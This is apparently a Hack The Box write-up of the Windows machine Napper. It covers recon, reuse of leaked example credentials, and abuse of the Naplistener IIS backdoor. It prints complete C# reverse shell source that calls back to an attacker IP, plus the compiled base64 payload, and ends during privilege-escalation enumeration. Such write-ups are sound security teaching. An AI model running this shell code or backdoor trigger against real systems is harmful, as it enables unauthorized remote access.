---
title: HTB: Napper
url: https://0xdf.gitlab.io/2024/05/04/htb-napper.html
date: 2024-05-04T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: htb-napper, ctf, hackthebox, nmap, windows, iis, subdomain, ffuf, hugo, feroxbuster, burp, burp-repeater, naplistener-malware, malware, csharp, dotnet, dotnet-reverse-shell, mcs, laps, elasticsearch, chisel, tunnel, smbserver, ghidra, golang, golang-re, youtube, uac, runascs, scheduled-tasks, dotpeek, htb-haystack
---

![Napper](/img/napper-cover.png)

Napper presents two interesting coding challenges wrapping in a story of real malware and a custom LAPS alternative. I’ll start by finding a username and password in a blog post, and using it to get access to an internal blog. This blog talks about a real IIS backdoor, Naplistener, and mentions running it locally. I’ll find it on Napper, and write a custom .NET binary that will run when passed to the backdoor to get a shell. On the box, I’ll find a draft blog post about a new internally developed solution to replace LAPS, which stores the password in a local Elastic Search DB. I’ll write a Go program to fetch the seed and the encrypted blob, generate the key from the seed, and use the key to decrypt the blob, resulting in the password for a user with admin access. I’ll use RunasCs.exe to bypass UAC and get a shell with administrator privileges. In Beyond Root, I’ll explore the automations for the box, including the both how the password is rotated every 5 minutes, and what changes are made to the real malware for HTB.

## Box Info

| Name | [Napper](https://hackthebox.com/machines/napper)  [Napper](https://hackthebox.com/machines/napper) [Play on HackTheBox](https://hackthebox.com/machines/napper) |
| --- | --- |
| Release Date | [11 Nov 2023](https://twitter.com/hackthebox_eu/status/1722615054020030514) |
| Retire Date | 04 May 2024 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Napper |
| Radar Graph | Radar chart for Napper |
| First Blood User | 00:54:05[pottm pottm](https://app.hackthebox.com/users/141036) |
| First Blood Root | 04:44:36[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [133742 133742](https://app.hackthebox.com/users/232246) |

## Recon

### nmap

`nmap` finds two open TCP ports, HTTP (80) and HTTPS (443):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.240
Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-26 17:13 EDT
Nmap scan report for 10.10.11.240
Host is up (0.10s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 13.69 seconds
oxdf@hacky$ nmap -p 80,443 -sCV 10.10.11.240
Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-26 17:13 EDT
Nmap scan report for 10.10.11.240
Host is up (0.097s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://app.napper.htb
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-generator: Hugo 0.112.3
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Research Blog | Home 
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
|_ssl-date: 2024-04-26T21:14:07+00:00; -3s from scanner time.
| tls-alpn: 
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions) it seems the box is running something Windows 10 or Server 2016 or newer.

There’s a redirect to `https://app.napper.htb` on 80, and the TLS certificate has that same domain.

### Subdomains

I’ll scan for subdomains that respond differently with `ffuf`:

```

oxdf@hacky$ ffuf -u https://10.10.11.240 -H "Host: FUZZ.napper.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.240
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.napper.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

internal                [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 91ms]
:: Progress: [19966/19966] :: Job [1/1] :: 370 req/sec :: Duration: [0:00:52] :: Errors: 0 ::

```

It finds one, `internal.napper.htb`. I’ll add all of these to my `/etc/hosts` file:

```
10.10.11.240 napper.htb app.napper.htb internal.napper.htb

```

### app.napper.htb - TCP 443

#### Site

HTTP just redirects to HTTPS. The site is a blog with technical articles:

![image-20240426172215662](/img/image-20240426172215662.png)

Looking through the articles for interesting information, one important thing to notice is that in “Enabling Basic Authentication on IIS Using PowerShell: A Step-by-Step Guide”, there’s a terminal with the example command to create the user account to use for Basic Auth:

![image-20240429091503938](/img/image-20240429091503938.png)

#### Tech Stack

The footer of the site says “Built with Hugo”. [Hugo](https://gohugo.io/) is a Go-based static site generator, which takes in markdown and generates static HTML.

The HTTP response headers show IIS, but nothing else of interest:

```

HTTP/2 200 OK
Content-Type: text/html
Last-Modified: Thu, 08 Jun 2023 09:11:18 GMT
Accept-Ranges: bytes
Etag: "993e162fe999d91:0"
Server: Microsoft-IIS/10.0
Date: Fri, 26 Apr 2024 21:21:00 GMT
Content-Length: 5602

```

The 404 page is just the IIS default:

![image-20240426172824359](/img/image-20240426172824359.png)

This seems like a static site.

#### Directory Brute Force

I’ll run `feroxbuster` against the site (using a lowercase wordlist as IIS is not case sensitive), but it doesn’t turn up anything interesting:

```

oxdf@hacky$ feroxbuster -u https://app.napper.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://app.napper.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      186l      375w     5602c https://app.napper.htb/
301      GET        2l       10w      150c https://app.napper.htb/css => https://app.napper.htb/css/
301      GET        2l       10w      149c https://app.napper.htb/js => https://app.napper.htb/js/
301      GET        2l       10w      151c https://app.napper.htb/page => https://app.napper.htb/page/
301      GET        2l       10w      151c https://app.napper.htb/tags => https://app.napper.htb/tags/
301      GET        2l       10w      152c https://app.napper.htb/fonts => https://app.napper.htb/fonts/
301      GET        2l       10w      158c https://app.napper.htb/tags/report => https://app.napper.htb/tags/report/
301      GET        2l       10w      157c https://app.napper.htb/categories => https://app.napper.htb/categories/
301      GET        2l       10w      153c https://app.napper.htb/page/1 => https://app.napper.htb/page/1/
301      GET        2l       10w      153c https://app.napper.htb/page/2 => https://app.napper.htb/page/2/
301      GET        2l       10w      155c https://app.napper.htb/tags/ssl => https://app.napper.htb/tags/ssl/
301      GET        2l       10w      152c https://app.napper.htb/posts => https://app.napper.htb/posts/
301      GET        2l       10w      160c https://app.napper.htb/tags/tutorial => https://app.napper.htb/tags/tutorial/
301      GET        2l       10w      166c https://app.napper.htb/tags/authentication => https://app.napper.htb/tags/authentication/
301      GET        2l       10w      155c https://app.napper.htb/tags/iis => https://app.napper.htb/tags/iis/
301      GET        2l       10w      164c https://app.napper.htb/tags/introduction => https://app.napper.htb/tags/introduction/
400      GET        6l       26w      324c https://app.napper.htb/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/js/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/css/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/tags/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/page/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/fonts/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/tags/report/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/tags/ssl/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/categories/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/page/1/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/page/2/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/posts/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/tags/tutorial/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/tags/authentication/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/tags/iis/error%1F_log
400      GET        6l       26w      324c https://app.napper.htb/tags/introduction/error%1F_log
[####################] - 3m    425344/425344  0s      found:32      errors:66
[####################] - 2m     26584/26584   153/s   https://app.napper.htb/
[####################] - 2m     26584/26584   153/s   https://app.napper.htb/css/
[####################] - 2m     26584/26584   154/s   https://app.napper.htb/js/
[####################] - 2m     26584/26584   152/s   https://app.napper.htb/page/
[####################] - 2m     26584/26584   153/s   https://app.napper.htb/tags/
[####################] - 2m     26584/26584   152/s   https://app.napper.htb/fonts/
[####################] - 2m     26584/26584   152/s   https://app.napper.htb/tags/report/
[####################] - 2m     26584/26584   153/s   https://app.napper.htb/categories/
[####################] - 2m     26584/26584   152/s   https://app.napper.htb/page/1/
[####################] - 2m     26584/26584   153/s   https://app.napper.htb/page/2/
[####################] - 2m     26584/26584   154/s   https://app.napper.htb/tags/ssl/
[####################] - 2m     26584/26584   153/s   https://app.napper.htb/posts/
[####################] - 2m     26584/26584   156/s   https://app.napper.htb/tags/tutorial/
[####################] - 2m     26584/26584   164/s   https://app.napper.htb/tags/authentication/
[####################] - 2m     26584/26584   175/s   https://app.napper.htb/tags/iis/
[####################] - 2m     26584/26584   188/s   https://app.napper.htb/tags/introduction/

```

### internal.napper.htb - TCP 443

#### Site

Trying to visit the internal website asks for HTTP basic auth:

![image-20240429090009786](/img/image-20240429090009786.png)

I’ll try the example credentials from the blog post [above](#site) (example:ExamplePassword), and it works!

![image-20240429091601690](/img/image-20240429091601690.png)

There is a single post about some malware research:

![image-20240429093823186](/img/image-20240429093823186.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There is an IIS malware that is processing requests sent to `/ews/MsExgHealthCheckd/` with a base64 encoded Dotnet executable as the `sdafwe3rwe23` parameter.

The notes also say that “will be testing local”, which implies it may be on this machine.

There are other detailed I’ll need to get from the [Elastic blog post](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph) referenced by this post:
- When the backdoor is successfully accessed, it returns a Server header with the string `Microsoft-HTTPAPI/2.0` appended to the end.
- An image of the malware source that shows how the assembly is invoked shows that it’s invoking a `Run` class in the decoded assembly:

[![image-20240429130750635](/img/image-20240429130750635.png)*Click for full size image*](/img/image-20240429130750635.png)

#### Tech Stack

The HTTP response headers just show the auth as well as that it’s IIS:

```

HTTP/2 401 Unauthorized
Content-Type: text/html
Server: Microsoft-IIS/10.0
Www-Authenticate: Basic realm="internal.napper.htb"
Date: Mon, 29 Apr 2024 12:59:39 GMT
Content-Length: 1293

```

Nothing interesting once authenticated.

## Shell as ruben

### Find Malware

#### Identify Server

#### Find Malware

I’ll try to see if this new path returns something on Napper. There’s a 404 on `app.napper.htb` (shown in Burp Repeater):

![image-20240429095329357](/img/image-20240429095329357.png)

`internal.napper.htb` returns a 401 unauthorized:

![image-20240429095415269](/img/image-20240429095415269.png)

If I add the authorization, it’s a 404:

![image-20240429095437302](/img/image-20240429095437302.png)

If I just try `napper.htb` (or the IP), there’s a subtle change:

![image-20240429095505519](/img/image-20240429095505519.png)

It’s still a 404, but the `Server` header is different. That’s a match to what was described in the [Elastic post](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph).

#### Get 200 Response

The post also mentioned having a parameter of `sdafwe3rwe23`. I’ll add this:

![image-20240429095756202](/img/image-20240429095756202.png)

Still 404. I might need some value there, or I might need a different kind of request. I’ll change this to a POST request (right click, “Change request method”).

![image-20240429095846815](/img/image-20240429095846815.png)

200 OK! That’s a good sign that I found the backdoor.

### Build C# Reverse Shell

#### Code

[This blog post](https://bank-security.medium.com/undetectable-c-c-reverse-shells-fab4c0ec4f15) talks about writing a reverse shell in C#, and has a link to the source code [here](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc). Very similar code is also on [revshells.com](https://www.revshells.com/) as “C# TCP Client”. It’s not clear to me which one was first.

I’ll paste in the code, and make a couple changes:
- Update the IP / port to what I want to catch the shell on.
- Make sure the namespace name matches the filename. Since I saved as `rev.cs`, I’ll make sure it’s `namespace rev`.
- Rename the `Program` class to `Run`.
- Rename `Main` to `Run` (the constructor for the `Run` class).

This gives the following code:

```

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace rev
{
    public class Run
    {
        static StreamWriter streamWriter;

        public Run()
        {   
            using(TcpClient client = new TcpClient("10.10.14.6", 443))
            {
                using(Stream stream = client.GetStream())
                {   
                    using(StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false; 
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while(true)
                        {   
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}

```

#### Compile

I’m going to compile this as a DLL using the `mcs` utility (`apt install mono-devel`):

```

oxdf@hacky$ mcs -target:library -out:rev.dll rev.cs 
rev.cs(63,26): warning CS0168: The variable `err' is declared but never used
Compilation succeeded - 1 warning(s)
oxdf@hacky$ ls rev.dll 
rev.dll

```

There is a warning about `err` being defined to catch errors but never being used, but otherwise it works and `rev.dll` exists.

### RCE

To upload this to Napper, I’ll base64 encode it:

```

oxdf@hacky$ base64 -w0 rev.dll ; echo
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAiELAQgAAAoAAAAGAAAAAAAATigAAAAgAAAAQAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAAAoAABLAAAAAEAAANACAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAVAgAAAAgAAAACgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAANACAAAAQAAAAAQAAAAMAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAwKAAAAAAAAEgAAAACAAUA6CEAABgGAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABswAwAEAQAAAQAAEQIoAQAACnIBAABwILsBAABzAgAACgoGbwMAAAoLB3MEAAAKDAdzBQAACoABAAAEcwYAAAoNcwcAAAoTBBEEbwgAAApyFwAAcG8JAAAKEQRvCAAAChdvCgAAChEEbwgAAAoWbwsAAAoRBG8IAAAKF28MAAAKEQRvCAAAChdvDQAAChEEbwgAAAoXbw4AAAoRBBT+BgIAAAZzDwAACm8QAAAKEQRvEQAACiYRBG8SAAAKCQhvEwAACm8UAAAKJhEEbxUAAAoJbxYAAAoJFglvFwAACm8YAAAKJjjT////CDkGAAAACG8ZAAAK3Ac5BgAAAAdvGQAACtwGOQYAAAAGbxkAAArcASgAAAIAJAC53QANAAAAAAIAHQDN6gANAAAAAAIAFgDh9wANAAAAABswAgBEAAAAAgAAEXMGAAAKCgNvGgAACigbAAAKOi0AAAAGA28aAAAKbxQAAAomfgEAAAQGbxYAAAp+AQAABG8cAAAK3QYAAAAL3QAAAAAqARAAAAAAFgAnPQAGEAAAAUJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAPgBAAAjfgAAZAIAANwCAAAjU3RyaW5ncwAAAABABQAAKAAAACNVUwBoBQAAEAAAACNHVUlEAAAAeAUAAKAAAAAjQmxvYgAAAAAAAAACAAAQVxUCAAkAAAAA+gEzABYAAAEAAAARAAAAAgAAAAEAAAACAAAAAgAAAB0AAAABAAAAAgAAAAEAAAACAAAAAADTAgEAAAAAAAYAHwAsAAYANgA9AAoASgBUAAYAZwAsAAoAeABUAAYAhgAsAAYAkwChAAoArQC1AAoA1gC1AAoAagG1AAYAtAEsAAYA4QEsAAYACAI9AAoAMwK1AAYAUgI9AAYAbQI9AAYAjAKqAgAAAAABAAAAAAABAAEAAQAQAA4ACgAJAAEAAQARABIAAQBQIAAAAACGGEQABQABAIghAAAAAJEAdwJqAAEAAAABABwCAAACACsCEQBEAAUAGQBEAAkAGQBuAA8AMQBEABQACQBEABQAOQBEAAUAQQBEAAUAQQDIABoASQDnAB8ASQD0ACQASQAHASQASQAbASQASQA2ASQASQBQASQAUQBEACkAQQCDAS8AQQCaATUAQQCgAQUAWQC/ATkAOQDIAT0AQQDPAUMAYQDsAUgAOQD2AU0AOQABAlEAaQAUAgUAcQBJAjkAeQBZAlgAYQBnAgUAiQBEAAUALgDrAHgAXQBxAASAAAAAAAAAAAAAAAAAAAAAAAoAAAAEAAAAAAAAAAAAAACXAMoCAAAAAAQAAAAAAAAAAAAAAJcAPQAAAAAAAAAAAAA8TW9kdWxlPgByZXYAUnVuAHN0cmVhbVdyaXRlcgBTdHJlYW1Xcml0ZXIAU3lzdGVtLklPAE9iamVjdABTeXN0ZW0ALmN0b3IAVGNwQ2xpZW50AFN5c3RlbS5OZXQuU29ja2V0cwBTdHJlYW0AR2V0U3RyZWFtAE5ldHdvcmtTdHJlYW0AU3RyZWFtUmVhZGVyAFN0cmluZ0J1aWxkZXIAU3lzdGVtLlRleHQAUHJvY2VzcwBTeXN0ZW0uRGlhZ25vc3RpY3MAZ2V0X1N0YXJ0SW5mbwBQcm9jZXNzU3RhcnRJbmZvAHNldF9GaWxlTmFtZQBzZXRfQ3JlYXRlTm9XaW5kb3cAc2V0X1VzZVNoZWxsRXhlY3V0ZQBzZXRfUmVkaXJlY3RTdGFuZGFyZE91dHB1dABzZXRfUmVkaXJlY3RTdGFuZGFyZElucHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IARGF0YVJlY2VpdmVkRXZlbnRIYW5kbGVyAGFkZF9PdXRwdXREYXRhUmVjZWl2ZWQAU3RhcnQAQmVnaW5PdXRwdXRSZWFkTGluZQBUZXh0UmVhZGVyAFJlYWRMaW5lAEFwcGVuZABnZXRfU3RhbmRhcmRJbnB1dABUZXh0V3JpdGVyAFdyaXRlTGluZQBnZXRfTGVuZ3RoAFJlbW92ZQBJRGlzcG9zYWJsZQBEaXNwb3NlAHNlbmRpbmdQcm9jZXNzAG91dExpbmUARGF0YVJlY2VpdmVkRXZlbnRBcmdzAGdldF9EYXRhAFN0cmluZwBJc051bGxPckVtcHR5AEZsdXNoAEV4Y2VwdGlvbgBDbWRPdXRwdXREYXRhSGFuZGxlcgBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAG1zY29ybGliAHJldi5kbGwAAAAVMQAwAC4AMQAwAC4AMQA0AC4ANgAAD2MAbQBkAC4AZQB4AGUAAABpFkjvBEsdRaRomDMaN8vxAAMGEgUDIAABBSACAQ4IBCAAEhUFIAEBEhEEIAASJQQgAQEOBCABAQIFIAIBHBgFIAEBEikDIAACAyAADgUgARIdDgQgABIFBCABARwDIAAIBiACEh0ICAQAAQIODAcFEg0SERIZEh0SIQYAAgEcEjkGBwISHRJBHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQi3elxWGTTgiSgoAAAAAAAAAAAAAD4oAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwKAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAHgCAAAAAAAAAAAAAHgCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAH8AsATYAQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAAC0AQAAAQAwADAANwBmADAANABiADAAAAAcAAIAAQBDAG8AbQBtAGUAbgB0AHMAAAAgAAAAJAACAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAgAAAALAACAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADAALgAwAC4AMAAuADAAAAAoAAQAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHIAZQB2AAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAACwAAgABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAgAAAAOAAIAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAHIAZQB2AC4AZABsAGwAAAAkAAIAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAACAAAAAoAAIAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAUDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

I’ll paste this in as the body of the working backdoor connection in Burp Repeater. I’ll re-select all of this, and Ctrl-U to URL-encode characters like `+`. With `nc` listening on 443, I’ll send the request, and the shell connects back:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.240 52857
Microsoft Windows [Version 10.0.19045.3636]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
napper\ruben

```

And I can grab `user.txt`:

```

C:\Users\ruben\Desktop>type user.txt
2f798392************************

```

I’ll also run `powershell` to switch from `cmd`.

## Shell as backup (administrator)

### Enumeration

#### Users

There are a few other users with home directories:

```

PS C:\Users> ls
    Directory: C:\Users
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/29/2023   1:05 PM                Administrator
d-----          6/9/2023   1:38 AM                backup
d-----          6/8/2023  12:56 AM                DefaultAppPool
d-----          6/8/2023  12:44 AM                internal
d-r---          6/7/2023   6:37 AM                Public
d-----        10/29/2023   1:05 PM                ruben     

```

ruben is not able to access any of them. There’s nothing else if interest in ruben’s home directory either.

#### Web

The `C:\inetpub` directory has the web roots for both sites, `wwwroot` and `internal`:

```

PS C:\inetpub> ls
    Directory: C:\inetpub
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/7/2023   7:02 AM                custerr
d-----         11/7/2023   6:34 AM                history
d-----          6/8/2023   4:54 AM                internal
d-----          6/8/2023  12:44 AM                logs
d-----          6/7/2023   7:02 AM                temp
d-----        10/29/2023  10:03 AM                wwwroot

```

Both of these contain no code, only the static HTML pages for the site. This makes sense as the site is built with Hugo.

Interestingly, I’ll find the Hugo base directories in `C:\temp\www`:

```

PS C:\temp\www> ls
    Directory: C:\temp\www
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/9/2023  12:18 AM                app
d-----          6/9/2023  12:18 AM                internal  

```

For example, `internal`:

```

PS C:\temp\www\internal> ls
    Directory: C:\temp\www\internal
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/9/2023  12:18 AM                archetypes
d-----          6/8/2023  11:14 AM                assets
d-----          6/9/2023  12:18 AM                content
d-----          6/8/2023  11:14 AM                data
d-----          6/8/2023  11:14 AM                layouts
d-----          6/9/2023  12:18 AM                public
d-----          6/9/2023  12:18 AM                resources
d-----          6/8/2023  11:14 AM                static
d-----          6/9/2023  12:18 AM                themes
